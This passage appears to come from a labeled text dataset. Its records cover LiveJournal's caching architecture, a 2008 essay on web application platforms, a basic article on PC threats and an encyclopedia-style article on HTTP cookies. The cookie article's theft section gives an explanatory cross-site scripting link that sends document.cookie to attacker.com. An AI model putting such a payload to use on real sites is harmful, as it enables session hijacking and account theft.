trade-offs. Because processors keep getting faster, I find it preferable to burn CPU cycles rather than wait for disks. Modern disks keeping growing larger and cheaper, but they aren't getting much faster. Considering how slow and crash-prone they are, I try to avoid disks as much as possible. LiveJournal's Web nodes are all diskless, Netbooting off a common yet redundant NFS root image. Not only is this cheaper, but it requires significantly less maintenance.\nOf course, disks are necessary for our database servers, but there we stick to fast disks with fast RAID setups. We actually have ten different database clusters, each with two or more machines. Nine of the clusters are user clusters, containing data specific to the users partitioned among them. One is our global cluster with non-user data and the table that maps users to their user clusters. The rationale for independent clusters is to spread writes. The alternative is having one big cluster with hundreds of slaves. The difficulty with such a monolithic cluster is it only spreads reads. The problem of diminishing returns appears as each new slave is added and increasingly is consumed by the writes necessary to stay up to date.\nAt this point you can see LiveJournal's back-end philosophy:\nAvoid disks: they're a pain. When necessary, use only fast, redundant I/O systems.\nScale out, not up: many little machines, not big machines.\nMy definition of a little machine is more about re-usability than cost. I want a machine I can keep using as long as it's worth its space and heat output. I don't want to scale by throwing out machines every six months, replacing them with bigger machines.\nPrior to Memcached, our Web nodes unconditionally hit our databases. This worked, but it wasn't as optimal as it could've been. I realized that even with 4G or 8G of memory, our database server caches were limited, both in raw memory size and by the address space available to our database server processes running on 32-bit machines. Yes, I could've replaced all our databases with 64-bit machines with much more memory, but recall that I'm stubborn and frugal.\nI wanted to cache more on our Web nodes. Unfortunately, because we're using mod_perl 1.x, caching is a pain. Each process and thus, each Web request, is in its own address space and can't share data with the others. Each of the 30–50 processes could cache on its own, but doing so would be wasteful.\nSystem V shared memory has too many weird limitations and isn't portable. It also works only on a single machine, not across 40+ Web nodes. These issues reflect what I saw as the main problem with most caching solutions. Even if our application platform was multithreaded with data easily shared between processes, we still could cache on only a single machine. I didn't want all 40+ machines caching independently and duplicating information.\n|Using Salt Stack and Vagrant for Drupal Development||May 20, 2013|\n|Making Linux and Android Get Along (It's Not as Hard as It Sounds)||May 16, 2013|\n|Drupal Is a Framework: Why Everyone Needs to Understand This||May 15, 2013|\n|Home, My Backup Data Center||May 13, 2013|\n|Non-Linux FOSS: Seashore||May 10, 2013|\n|Trying to Tame the Tablet||May 08, 2013|\n- RSS Feeds\n- Making Linux and Android Get Along (It's Not as Hard as It Sounds)\n- New Products\n- Drupal Is a Framework: Why Everyone Needs to Understand This\n- A Topic for Discussion - Open Source Feature-Richness?\n- Home, My Backup Data Center\n- Validate an E-Mail Address with PHP, the Right Way\n- Tech Tip: Really Simple HTTP Server with Python\n- New Products\n- Trying to Tame the Tablet\n- git-annex assistant\n5 hours 37 min ago\n- direct cable connection\n5 hours 59 min ago\n- Agreed on AirDroid. With my\n6 hours 10 min ago\n- I just learned this\n6 hours 14 min ago\n6 hours 44 min ago\n- not living upto the mobile revolution\n9 hours 35 min ago\n- Deceptive Advertising and\n10 hours 11 min ago\n- Let\\'s declare that you have\n10 hours 12 min ago\n- Alterations in Contest Due\n10 hours 13 min ago\n- At a numbers mindset, your\n10 hours 14 min ago\nEnter to Win an Adafruit Prototyping Pi Plate Kit for Raspberry Pi\nIt's Raspberry Pi month at Linux Journal. Each week in May, Adafruit will be giving away a Pi-related prize to a lucky, randomly drawn LJ reader. Winners will be announced weekly.\nFill out the fields below to enter to win this week's prize-- a Prototyping Pi Plate Kit for Raspberry Pi.\nCongratulations to our winners so far:\n- 5-8-13, Pi Starter Pack: Jack Davis\n- 5-15-13, Pi Model B 512MB RAM: Patrick Dunn\n- Next winner announced on 5-21-13!\nFree Webinar: Linux Backup and Recovery\nMost companies incorporate backup procedures for critical data, which can be restored quickly if a loss occurs. However, fewer companies are prepared for catastrophic system failures, in which they lose all data, the entire operating system, applications, settings, patches and more, reducing their system(s) to “bare metal.” After all, before data can be restored to a system, there must be a system to restore it to.\nIn this one hour webinar, learn how to enhance your existing backup strategies for better disaster recovery preparedness using Storix System Backup Administrator (SBAdmin), a highly flexible bare-metal recovery solution for UNIX and Linux systems.", "label": 1}
{"text": "What is a web application?\nBy \"web applications\", I mean interactive programs which run on any platform, and use, process or (often) display data available on a server. One important characteristic of such applications is that they run within the browser. Doing so has several important implications -- most of them security related. Web applications can only connect to the server they came from. If that weren't the case, I could create a web page with the \"small\" side effect of getting unaware visiting users to launch Denial Of Service attacks against anybody. Also, an application that runs within the browser can't access directly the local hardware and file system in order to prevent viruses and spyware.\nLoser #1: Java\nJava was created by Sun Microsystems, and -- most importantly -- was included in Netscape Navigator in 1995. That's 13 years ago! Java uses a virtual machine; this means that Java programs will run anywhere as long as a Java virtual machine is available. Java allows developers to create \"Java applets\" and \"Java applications\". The main difference is security (see the textbox): Java applets are expected to be found embedded in web pages, rather than installed, and therefore don't have full access to the underlying hardware. In 2008, I don't remember having seen a web page which included a Java applet for at least 5 years. Java has its niche markets: Java Server Pages (to create web applications ala PHP) and mobile devices (to create small applications). Android will probably push Java further (although it only uses Java as a language, rather than using the Java Virtual Machine). However, again, Java is nowhere to be seen in web pages.\nWhy? Because for the first 12 years of its life, Java's been proprietary. (Things are changing now. \"Too little, too late\".) Courageous people tried to write free, competing virtual machines, and managed. However, the problem was in the important Java libraries which Sun kept under a closed license for years and years and years. I am convinced that this problem also had technical repercussions on Java as a platform: Java applet were famous for crashing people's browsers in 1995 -- and they are still famous today for being immensely heavy and memory-hungry. I can only wonder how much better Java would be if the whole community were able to improve it and its libraries. Many also argue that the Java Virtual Machine -- and Java as a language -- is hardly fixable: the post I hate Java summarises some of the problems. (But, it is biased!) So, Java had all of the ingredients to become king in the web application domain: it was first, it was available in Windows and GNU/Linux, and it was ready. And yet, it was a closed platform and it had arguably big technical problems.\nLoser #2: Flash\nJust like Java, Flash was available very early, in 1997. Web authors could develop nice animations and more. It was better than Java (it didn't kill your browser) and it was easier to program. Fast-forward 11 years: Flash's main use is in video playing, and very little more. Adobe (which owns Flash) realised the potential of internet applications, and (about three years ago) released Flex. Flex, in oversimplifying terms, can be seen as a way for developers to create Flash files, using advanced libraries and advanced tools. Flex is absolutely fantastic.\nThe problem is that while the Flash player is \"free\" (that is, it doesn't cost anything although its source code is not available), Flex is outrageously expensive. And proprietary. [UPDATE: no, it's not expensive. It's been open sourced, and you don't need a Flex server to deploy Flex applications -- thanks Ben Forta!] And it creates applications running in a proprietary player (Flash). I have seen Flex. I have met some of the programmers who worked on it. They knew what they were doing. They were smart. They knew the internet -- I considered them internet magicians. However, nobody likes to fork out large sums of money in order to buy (or deploy) the development tools [UPDATE: this is no longer an issue], and nobody likes the idea of depending completely on the financial health and ethical principles of a single company. I think Flash and Flex are way superior to anything I have ever seen. If the Flash player were released under the GPL, its specifications fully documented [Note: this is still absolutely crucial], and Flex was released under a free license (maybe BSD-like?), then there could be a big chance of a huge market shift towards Adobe's technologies. Trouble is, it's not going to happen -- and it might even be too late.\nLoser #3: Silverlight\n.NET is Microsoft's answer to Java: it compiles things into bytecode, it's multi-platform, etc. Technically, many argue that it's \"Java as it should have been\". .NET isn't free: while the virtual machine and the language itself are ECMA standards, Microsoft's GUI libraries and other key components aren't. This means (surprise surprise) that you can't write a .NET program for Microsoft Windows, and run it under GNU/Linux, even though there is a .NET virtual machine for GNU/Linux (called \"Mono\"). If .NET is Microsoft's answer to Java, Silverlight is Microsoft's answer to Flash. Silverlight allows you to run .NET applications within your browser. The site silverlight.net is Silverlight's official web page. Although it's defined \"Multi platform\" by Microsoft itself, GNU/Linux is completely ignored (there are Windows and Apple downloads).\nSilverlight might erode Flash's tiny market. I don't think there's any difference between Flash and Silverlight: two competing products which are losing the Web Application race.\nWhy did such an unlikely combination win such an important war? Because it's based on available, open, free technologies. People don't have to spend thousands of dollars to write Flex applications. People don't have to install Microsoft Visual Studio for Silverlight. And don't have to battle the technical difficulties of Java (if it were still an option).\nWelcome to 2008.", "label": 1}
{"text": "Types of attacks your computer may suffer from on the net\nIf you surf the internet on a regular basis, then you must realize that your computer gets exposed to a variety of threats from the internet. Viruses, spyware, worms, and malware, everything is waiting to skim through your PC, scanning its contents and altering its components. Even more dangerous are hackers, who primarily target the sensitive data stored in your PC, including your e-mail passwords, and most importantly, your credit card numbers that you may provide to secure websites when purchasing something through online stores. Let us look into these threats individually:\n- Viruses – Computer viruses have always been the cause for alarm among PC users. Viruses work in different ways; some can slow down your PC to a crawl, others can wipe out data from your hard drive, corrupt system files and generally wreck havoc on your PC. Viruses are very dangerous, and you should always install some good antivirus software on your PC and keep it updated regularly. Scan your PC with this regularly to make sure that it is free from viruses and if not, learn how to find out which virus is on your computer.\n- Worms – These are not anywhere near viruses in danger factor, but can be pretty annoying. These malicious bits of software can stay resident in the memory, thereby slowing down your PC, sapping away RAM, interfering with the speed of your internet connection, and what not. What’s worse is that these often have a nasty habit of sending e-mails to every contact in your address book. Not a good thing. However, a good quality antivirus will be able to keep most worms at bay.\n- Spyware – These are small bits of malicious software that usually infiltrate your PC through certain websites. These usually get installed without user intervention, which means that you will not even know when your PC is getting infected by a spyware, unless you receive a intrusion warning message from your antivirus or firewall. Spywares can be dangerous when these enter your PC, because these can act as keyloggers, tapping into your key presses and sending information about those through the internet to the people who created the spyware in the first place.\n- Malware – These are similar to spyware, in that these often have similar ways of working. The main difference is that these usually pose a very innocent face up front, so in most cases, you will be installing these programs inadvertently in your PC.\nYour PC has to withstand many attacks in the form of one or more of these threats on a regular basis, whenever you are connected to the internet. Keep a good firewall and antivirus installed in your PC, to make sure that the dangerous denizens of the Internet leave your PC alone.\nRelated article: Malicious programs descriptions\nOld drivers harm system performance and make your PC vulnerable to errors and crashes.\nPosted in Internet Security", "label": 1}
{"text": "A cookie, also known as an HTTP cookie, web cookie, or browser cookie, is a small piece of data sent from a website and stored in a user's web browser while a user is browsing a website. When the user browses the same website in the future, the data stored in the cookie can be retrieved by the website to notify the website of the user's previous activity. Cookies were designed to be a reliable mechanism for websites to remember the state of the website or activity the user had taken in the past. This can include clicking particular buttons, logging in, or a record of which pages were visited by the user even months or years ago.\nAlthough cookies cannot carry viruses, and cannot install malware on the host computer, tracking cookies and especially third-party tracking cookies are commonly used as ways to compile long-term records of individuals' browsing histories — a major privacy concern that prompted European and US law makers to take action in 2011. Cookies can also store passwords and forms a user has previously entered, such as a credit card number or an address. When a user accesses a Web site with a cookie function for the first time, a cookie is sent from server to the browser and stored with the browser in the local computer. Later when that user goes back to the same website, the website will recognize the user because of the stored cookie with the user's information.\nOther kinds of cookies perform essential functions in the modern Web. Perhaps most importantly, authentication cookies are the most common method used by web servers to know whether the user is logged in or not, and which account they are logged in under. Without such a mechanism, the site would not know whether to send a page containing sensitive information, or require the user to authenticate himself by logging in. The security of an authentication cookie generally depends on the security of the issuing website and the user's web browser, and on whether the cookie data is encrypted. Security vulnerabilities may allow a cookie's data to be read by a hacker, used to gain access to user data, or used to gain access (with the user's credentials) to the website to which the cookie belongs (see cross-site scripting and cross-site request forgery for examples).\nThe term \"cookie\" was derived from \"magic cookie\", which is the packet of data a program receives and sends again unchanged. Magic cookies were already used in computing when computer programmer Lou Montulli had the idea of using them in Web communications in June 1994. At the time, he was an employee of Netscape Communications, which was developing the e-commerce application \"MCI Mall\" for MCI. Vint Cerf and John Klensin represented MCI in technical discussions with Netscape Communications. Not wanting the MCI Mall servers to have to retain partial transaction states led to MCI's request to Netscape to find a way to store that state in each user's computer. Cookies provided a solution to the problem of reliably implementing a virtual shopping cart.\nThe introduction of cookies was not widely known to the public at the time. In particular, cookies were accepted by default, and users were not notified of the presence of cookies. The general public learned about them after the Financial Times published an article about them on February 12, 1996. In the same year, cookies received a lot of media attention, especially because of potential privacy implications. Cookies were discussed in two U.S. Federal Trade Commission hearings in 1996 and 1997.\nThe development of the formal cookie specifications was already ongoing. In particular, the first discussions about a formal specification started in April 1995 on the www-talk mailing list. A special working group within the IETF was formed. Two alternative proposals for introducing state in HTTP transactions had been proposed by Brian Behlendorf and David Kristol respectively, but the group, headed by Kristol himself and Aron Afatsuom, soon decided to use the Netscape specification as a starting point. In February 1996, the working group identified third-party cookies as a considerable privacy threat. The specification produced by the group was eventually published as RFC 2109 in February 1997. It specifies that third-party cookies were either not allowed at all, or at least not enabled by default.\nAt this time, advertising companies were already using third-party cookies. The recommendation about third-party cookies of RFC 2109 was not followed by Netscape and Internet Explorer. RFC 2109 was superseded by RFC 2965 in October 2000.\nA definitive specification for cookies as used in the real world was published as RFC 6265 in April 2011.\n||This section needs additional citations for verification. (August 2011)|\nA user's session cookie (also known as an in-memory cookie or transient cookie) for a website exists in temporary memory only while the user is reading and navigating the website. When an expiry date or validity interval is not set at cookie creation time, a session cookie is created. Web browsers normally delete session cookies when the user closes the browser.\nA persistent cookie will outlast user sessions. If a persistent cookie has its Max-Age set to 1 year, then, within the year, the initial value set in that cookie would be sent back to the server every time the user visited the server. This could be used to record a vital piece of information such as how the user initially came to this website. For this reason persistent cookies are also called tracking cookies.\nA secure cookie has the secure attribute enabled and is only used via HTTPS, ensuring that the cookie is always encrypted when transmitting from client to server. This makes the cookie less likely to be exposed to cookie theft via eavesdropping.\nFirst-party cookies are cookies set with the same domain (or its subdomain) as your browser's address bar. Third-party cookies are cookies set with domains different from the one shown on the address bar. The web pages on the first domain may feature content from a third-party domain, e.g. a banner advert run by\nwww.advexample.com. Privacy setting options in most modern browsers allow you to block third-party tracking cookies.\nAs an example, suppose a user visits\nwww.example1.com, which includes an advert which sets a cookie with the domain\nad.foxytracking.com. When the user later visits\nwww.example2.com, another advert can set another cookie with the domain\nad.foxytracking.com. Eventually, both of these cookies will be sent to the advertiser when loading their ads or visiting their website. The advertiser can then use these cookies to build up a browsing history of the user across all the websites this advertiser has footprints on.\nA \"supercookie\" is a cookie with an origin of a Top-Level Domain (TLD) or an effective Top-Level Domain. Some domains that are considered, \"Top-Level\" may in fact be a secondary or lower-level domain. For example,\nk12.ca.us are considered Top-Level even though they are multiple levels deep. These domains are referred to as Public Suffixes and are not open for reservation by end-users.\nMost browsers, by default, allow first-party cookies—a cookie with domain to be the same or sub-domain of the requesting host. For example, a user visiting\nwww.example.com can have a cookie set with domain\n.example.com. A so-called \"supercookie\" is a cookie originating from a Public Suffix or Top-Level Domain such as,\n.com. It is important that these cookies are blocked by browsers otherwise, an attacker in control of malicious website with domain\n.com could set a \"supercookie\" and potentially disrupt or impersonate legitimate user requests to\nexample.com. Thus taking advantage of the fact that\n.com can set valid cookies for sub-domain\nThe Public Suffix List is a cross-vendor initiative to provide an accurate list of domain name suffixes changing. Older versions of browsers may not have the most up-to-date list, and will therefore be vulnerable to supercookies from certain domains.\nThe term \"supercookie\" is sometimes used for tracking technologies that do not rely on HTTP cookies. Two such \"supercookie\" mechanisms were found on Microsoft websites: cookie syncing that respawned MUID cookies, and ETag cookies. Due to media attention, Microsoft later disabled this code:\nIn response to recent attention on \"supercookies\" in the media, we wanted to share more detail on the immediate action we took to address this issue, as well as affirm our commitment to the privacy of our customers. According to researchers, including Jonathan Mayer at Stanford University, \"supercookies\" are capable of re-creating users' cookies or other identifiers after people deleted regular cookies. Mr. Mayer identified Microsoft as one among others that had this code, and when he brought his findings to our attention we promptly investigated. We determined that the cookie behavior he observed was occurring under certain circumstances as a result of older code that was used only on our own sites, and was already scheduled to be discontinued. We accelerated this process and quickly disabled this code. At no time did this functionality cause Microsoft cookie identifiers or data associated with those identifiers to be shared outside of Microsoft.—Mike Hintze\nSome cookies are automatically recreated after a user has deleted them; these are called zombie cookies. This is accomplished by a script storing the content of the cookie in some other locations, such as the local storage available to Flash content, HTML5 storages and other client side mechanisms, and then recreating the cookie from backup stores when the cookie's absence is detected.\n1. Name of the cookie\n2. Value of the cookie\n3. The expiry of the cookie (using Greenwich Mean Time)\n4. The path the cookie is good for\n5. The domain the cookie is good for\n6. The need for a secure connection to use the cookie\nOnly the first two parameters are required for the successful operation of the cookie.\nSession management \nCookies may be used to maintain data related to the user during navigation, possibly across multiple visits. Cookies were introduced to provide a way to implement a \"shopping cart\" (or \"shopping basket\"), a virtual device into which users can store items they want to purchase as they navigate throughout the site.\nShopping basket applications today usually store the list of basket contents in a database on the server side, rather than storing basket items in the cookie itself. A web server typically sends a cookie containing a unique session identifier. The web browser will send back that session identifier with each subsequent request and shopping basket items are stored associated with a unique session identifier.\nCookies provide a quick and convenient means of client/server interaction. One of the advantages of cookies lies in the fact that they store the user information locally while identifying users simply based on cookie matching. The server's storage and retrieval load is greatly reduced. As a matter of fact, the possibility of applications is endless - anytime personal data need to be saved they can be saved as a cookie (Kington, 1997).\nCookies may be used to remember the information about the user who has visited a website in order to show relevant content in the future. For example a web server may send a cookie containing the username last used to log into a website so that it may be filled in for future visits.\nTracking cookies may be used to track internet users' web browsing. This can also be done in part by using the IP address of the computer requesting the page or the referrer field of the HTTP request header, but cookies allow for greater precision. This can be demonstrated as follows:\n- If the user requests a page of the site, but the request contains no cookie, the server presumes that this is the first page visited by the user; the server creates a random string and sends it as a cookie back to the browser together with the requested page;\n- From this point on, the cookie will automatically be sent by the browser to the server every time a new page from the site is requested; the server sends the page as usual, but also stores the URL of the requested page, the date/time of the request, and the cookie in a log file.\nBy analyzing the log file collected in the process, it is then possible to find out which pages the user has visited, in what sequence, and for how long.\nCookie specifications suggest that browsers should be able to save and send back a minimal number of cookies. In particular, a web browser is expected to be able to store at least 300 cookies of four kilobytes each, and at least 20 cookies per server or domain.\nTransfer of Web pages follows the HyperText Transfer Protocol (HTTP). Regardless of cookies, browsers request a page from web servers by sending them a usually short text called HTTP request. For example, to access the page http://www.example.org/index.html, browsers connect to the server www.example.org sending it a request that looks like the following one:\nThe server replies by sending the requested page preceded by a similar packet of text, called 'HTTP response'. This packet may contain lines requesting the browser to store cookies:\nThe server sends lines of\nSet-Cookie only if the server wishes the browser to store cookies.\nSet-Cookie is a directive for the browser to store the cookie and send it back in future requests to the server (subject to expiration time or other cookie attributes), if the browser supports cookies and cookies are enabled. For example, the browser requests the page http://www.example.org/spec.html by sending the server www.example.org a request like the following:\nThis is a request for another page from the same server, and differs from the first one above because it contains the string that the server has previously sent to the browser. This way, the server knows that this request is related to the previous one. The server answers by sending the requested page, possibly adding other cookies as well.\nThe value of a cookie can be modified by the server by sending a new\nSet-Cookie: name=newvalue line in response of a page request. The browser then replaces the old value with the new one.\nThe value of a cookie may consist of any printable ascii character (\n; and excluding whitespace. The name of the cookie also excludes\n= as that is the delimiter between the name and value. The cookie standard RFC2965 is more limiting but not implemented by browsers.\nThe term \"cookie crumb\" is sometimes used to refer to the name-value pair. This is not the same as breadcrumb web navigation, which is the technique of showing in each page the list of pages the user has previously visited; this technique, however, may be implemented using cookies.\ndocument.cookie is used for this purpose. For example, the instruction\ndocument.cookie = \"temperature=20\" creates a cookie of name\ntemperature and value\nCookie attributes \nBesides the name–value pair, servers can also set these cookie attributes: a cookie domain, a path, expiration time or maximum age, Secure flag and HttpOnly flag. Browsers will not send cookie attributes back to the server. They will only send the cookie’s name-value pair. Cookie attributes are used by browsers to determine when to delete a cookie, block a cookie or whether to send a cookie (name-value pair) to the servers.\nDomain and Path \nThe cookie domain and path define the scope of the cookie—they tell the browser that cookies should only be sent back to the server for the given domain and path. If not specified, they default to the domain and path of the object that was requested. An example of Set-Cookie directives from a website after a user logged in:\nThe first cookie\nLSID has default domain\ndocs.foo.com and Path\n/accounts, which tells the browser to use the cookie only when requesting pages contained in\ndocs.foo.com/accounts. The other 2 cookies\nSSID would be sent back by the browser while requesting any subdomain in\n.foo.com on any path, for example\nCookies can only be set on the top domain and its sub domains. Setting cookies on\nwww.bar.com will not work for security reasons.\nExpires and Max-Age \nThe Expires directive tells the browser when to delete the cookie. Derived from the format used in RFC 1123, the date is specified in the form of “Wdy, DD Mon YYYY HH:MM:SS GMT”, indicating the exact date/time this cookie will expire. As an alternative to setting cookie expiration as an absolute date/time, RFC 6265 allows the use of the Max-Age attribute to set the cookie’s expiration as an interval of seconds in the future, relative to the time the browser received the cookie. An example of Set-Cookie directives from a website after a user logged in:\nThe first cookie\nlu is set to expire sometime in 15-Jan-2013; it will be used by the client browser until that time. The second cookie\nmade_write_conn does not have an expiration date, making it a session cookie. It will be deleted after the user closes their browser. The third cookie\nreg_fb_gate has its value changed to deleted, with an expiration time in the past. The browser will delete this cookie right away – note that cookie will only be deleted when the domain and path attributes in the\nSet-Cookie field match the values used when the cookie was created.\nSecure and HttpOnly \nThe Secure and HttpOnly attributes do not have associated values. Rather, the presence of the attribute names indicates that the Secure and HttpOnly behaviors are specified.\nBrowser settings \nMost modern browsers support cookies and allow the user to disable them. The following are common options:\n- To enable or disable cookies completely, so that they are always accepted or always blocked.\n- Some browsers incorporate a cookie manager for the user to see and selectively delete the cookies currently stored in the browser.\n- By default, Internet Explorer allows only third-party cookies that are accompanied by a P3P \"CP\" (Compact Policy) field.\nAdvertising companies use third-party cookies to track a user across multiple sites. In particular, an advertising company can track a user across all pages where it has placed advertising images or web bugs. Knowledge of the pages visited by a user allows the advertising company to target advertisements to the user's presumed preferences.\nThe possibility of building a profile of users is considered by some a potential privacy threat, especially when tracking is done across multiple domains using third-party cookies. For this reason, some countries have legislation about cookies.\nThe United States government has set strict rules on setting cookies in 2000 after it was disclosed that the White House drug policy office used cookies to track computer users viewing its online anti-drug advertising. In 2002, privacy activist Daniel Brandt found that the CIA had been leaving persistent cookies on computers which had visited its website. When notified it was violating policy, CIA stated that these cookies were not intentionally set and stopped setting them. On December 25, 2005, Brandt discovered that the National Security Agency (NSA) had been leaving two persistent cookies on visitors' computers due to a software upgrade. After being informed, the National Security Agency immediately disabled the cookies.\nEU Cookie Law \nIn 2002, the European Union launched the Directive on Privacy and Electronic Communications, a policy requiring end users’ consent for the placement of cookies, and similar technologies for storing and accessing information on users’ equipment. In particular, Article 5 Paragraph 3 mandates that storing data in a user’s computer can only be done if the user is provided information about how this data is used, and the user is given the possibility of denying this storing operation.\nDirective 95/46/EC defines ‘the data subject’s consent’ as: “any freely given specific and informed indication of his wishes by which the data subject signifies his agreement to personal data relating to him being processed”. Consent must involve some form of communication where individuals knowingly indicate their acceptance.\nIn 2009, the policy was amended by Directive 2009/136/EC, which included a change to Article 5 Paragraph 3. Instead of having an option for users to opt out of cookie storage, the revised Directive requires consent to be obtained for cookie storage.\nIn June 2012, European data protection authorities adopted an opinion which clarifies that some cookie users might be exempt from the requirement to gain consent:\n- Some cookies can be exempted from informed consent under certain conditions if they are not used for additional purposes. These cookies include cookies used to keep track of a user’s input when filling online forms or as a shopping cart.\n- First party analytics cookies are not likely to create a privacy risk if websites provide clear information about the cookies to users and privacy safeguards.\nThe industry’s response has been largely negative. Some viewed the Directive as an infernal doomsday machine that will \"kill online sales\" and \"kill the internet\". Robert Bond of the law firm Speechly Bircham describes the effects as \"far-reaching and incredibly onerous\" for \"all UK companies.\" Simon Davis of Privacy International argues that proper enforcement would \"destroy the entire industry.\"\nThird-party cookies can be blocked by most browsers to increase privacy and reduce tracking by advertising and tracking companies without negatively affecting the user's Web experience. Many advertising operators have an opt-out option to behavioural advertising, with a generic cookie in the browser stopping behavioural advertising.\nCookie theft and session hijacking \n||This section has multiple issues. Please help improve it or discuss these issues on the talk page.\nListed here are various scenarios of cookie theft and user session hijacking (even without stealing user cookies) which work with websites which rely solely on HTTP cookies for user identification.\nNetwork eavesdropping \nTraffic on a network can be intercepted and read by computers on the network other than the sender and receiver (particularly over unencrypted open Wi-Fi). This traffic includes cookies sent on ordinary unencrypted HTTP sessions. Where network traffic is not encrypted, attackers can therefore read the communications of other users on the network, including HTTP cookies as well as the entire contents of the conversations, for the purpose of a man-in-the-middle attack.\nAn attacker could use intercepted cookies to impersonate a user and perform a malicious task, such as transferring money out of the victim’s bank account.\nThis issue can be resolved by securing the communication between the user's computer and the server by employing Transport Layer Security (HTTPS protocol) to encrypt the connection. A server can specify the Secure flag while setting a cookie, which will cause the browser to send the cookie only over an encrypted channel, such as an SSL connection.\nPublishing false sub-domain – DNS cache poisoning \nVia DNS cache poisoning, an attacker might be able to cause a DNS server to cache a fabricated DNS entry, say\nf12345.www.example.com with the attacker’s server IP address. The attacker can then post an image URL from his own server (for example,\nhttp://f12345.www.example.com/img_4_cookie.jpg). Victims reading the attacker’s message would download this image from\nf12345.www.example.com is a sub-domain of\nwww.example.com, victims’ browsers would submit all\nexample.com-related cookies to the attacker’s server; the compromised cookies would also include HttpOnly cookies.[clarification needed]\nThis vulnerability is usually for Internet Service Providers to fix, by securing their DNS servers. But it can also be mitigated if\nwww.example.com is using Secure cookies. Victims’ browsers will not submit Secure cookies if the attacker’s image is not using encrypted connections. If the attacker chose to use HTTPS for his img_4_cookie.jpg download, he would have the challenge of obtaining an SSL certificate for\nf12345.www.example.com from a Certificate Authority. Without a proper SSL certificate, victims’ browsers would display (usually very visible) warning messages about the invalid certificate, thus alerting victims as well as security officials from\nwww.example.com (the latter would require someone to inform the security officials).\nAs an example, an attacker may post a message on\nwww.example.com with the following link:\n<a href=\"#\" onclick=\"window.location='http://attacker.com/stole.cgi?text='+escape(document.cookie); return false;\">Click here!</a>\nWhen another user clicks on this link, the browser executes the piece of code within the\nonclick attribute, thus replacing the string\ndocument.cookie with the list of cookies of the user that are active for the page. As a result, this list of cookies is sent to the\nattacker.com server. If the attacker’s posting is on\nhttps://www.example.com/somewhere, secure cookies will also be sent to attacker.com in plain text.\nCross-site scripting is a constant threat, as there are always some crackers trying to find a way of slipping in script tags to websites. It is the responsibility of the website developers to filter out such malicious code.\nIn the meantime, such attacks can be mitigated by using HttpOnly cookies. These cookies will not be accessible by client side script, and therefore, the attacker will not be able to gather these cookies.\nCross-site scripting \nIf an attacker was able to insert a piece of script to a page on\nwww.example.com, and a victim’s browser was able to execute the script, the script could simply carry out the attack. This attack would use the victim’s browser to send HTTP requests to servers directly; therefore, the victim’s browser would submit all relevant cookies, including HttpOnly cookies, as well as Secure cookies if the script request is on HTTPS.\nFor example, on MySpace, Samy posted a short message “Samy is my hero” on his profile, with a hidden script to send Samy a “friend request” and then post the same message on the victim’s profile. A user reading Samy’s profile would send Samy a “friend request” and post the same message on this person’s profile. Then, the third person reading the second person’s profile would do the same. Pretty soon, this Samy worm became one of the fastest spreading worms of all time.\nThis type of attack (with automated scripts) would not work if a website had CAPTCHA to challenge client requests.\nCross-site scripting – proxy request \nIn older versions of browsers, there were security holes allowing attackers to script a proxy request by using XMLHttpRequest. For example, a victim is reading an attacker’s posting on\nwww.example.com, and the attacker’s script is executed in the victim’s browser. The script generates a request to\nwww.example.com with the proxy server\nattacker.com. Since the request is for\nexample.com cookies will be sent along with the request, but routed through the attacker’s proxy server, hence, the attacker can harvest the victim’s cookies.\nThis attack would not work for Secure cookie, since Secure cookies go with HTTPS connections, and its protocol dictates end-to-end encryption, i.e., the information is encrypted on the user’s browser and decrypted on the destination server\nwww.example.com, so the proxy servers would only see encrypted bits and bytes.\nCross-site request forgery \nFor example, Bob might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Bob's bank's website (rather than an image file), e.g.,\nIf Bob's bank keeps his authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Bob's browser to load the image will submit the withdrawal form with his cookie, thus authorizing a transaction without Bob's approval.\nBesides privacy concerns, cookies also have some technical drawbacks. In particular, they do not always accurately identify users, they can be used for security attacks, and they are often at odds with the Representational State Transfer (REST) software architectural style.\nInaccurate identification \nIf more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence cookies do not identify a person, but a combination of a user account, a computer, and a Web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.\nLikewise, cookies do not differentiate between multiple users who share the same user account, computer, and browser.\nInconsistent state on client and server \nInconsistent support by devices \nThe problem with using mobile cookies is that most devices do not implement cookies; for example, Nokia only supports cookies on 60% of its devices, while Motorola only supports cookies on 45% of its phones. In addition, some gateways and networks (Verizon, Alltel, and MetroPCS) strip cookies, while other networks simulate cookies on behalf of their mobile devices. There are also dramatic variations in the wireless markets around the world; for example, in the United Kingdom 94% of the devices support wireless cookies, while in the United States only 47% support them.\nThe support for cookies is greater in the Far East, where wireless devices are more commonly used to access the web. Mobile cookies is a practice already in place in Japan, so that whether watching a podcast, a video, TV, clicking on a loan calculator or a GPS map—on almost all wireless devices—cookies can be set for tracking and capturing wireless behaviors.\nSome of the operations that can be done using cookies can also be done using other mechanisms.\nIP address \nSome users may be tracked based on the IP address of the computer requesting the page. The server knows the IP address of the computer running the browser or the proxy, if any is used, and could theoretically link a user's session to this IP address.\nIP addresses are, generally, not a reliable way to track a session or identify a user. Many computers designed to be used by a single user, such as office PCs or home PCs, are behind a network address translator (NAT). This means that several PCs will share a public IP address. Furthermore, some systems, such as Tor, are designed to retain Internet anonymity, rendering tracking by IP address impractical, impossible, or a security risk.\nURL (query string) \nA more precise technique is based on embedding information into URLs. The query string part of the URL is the one that is typically used for this purpose, but other parts can be used as well. The Java Servlet and PHP session mechanisms both use this method if cookies are not enabled.\nThis method consists of the Web server appending query strings to the links of a Web page it holds when sending it to a browser. When the user follows a link, the browser returns the attached query string to the server.\nQuery strings used in this way and cookies are very similar, both being arbitrary pieces of information chosen by the server and sent back by the browser. However, there are some differences: since a query string is part of a URL, if that URL is later reused, the same attached piece of information is sent to the server. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by e-mail, those preferences will be used for that other user as well.\nMoreover, even if the same user accesses the same page two times, there is no guarantee that the same query string is used in both views. For example, if the same user arrives to the same page but coming from a page internal to the site the first time and from an external search engine the second time, the relative query strings are typically different while the cookies would be the same. For more details, see query string.\nOther drawbacks of query strings are related to security: storing data that identifies a session in a query string enables or simplifies session fixation attacks, referrer logging attacks and other security exploits. Transferring session identifiers as HTTP cookies is more secure.\nHidden form fields \nAnother form of session tracking is to use web forms with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks; and if the form is handled with the HTTP GET method, the fields actually become part of 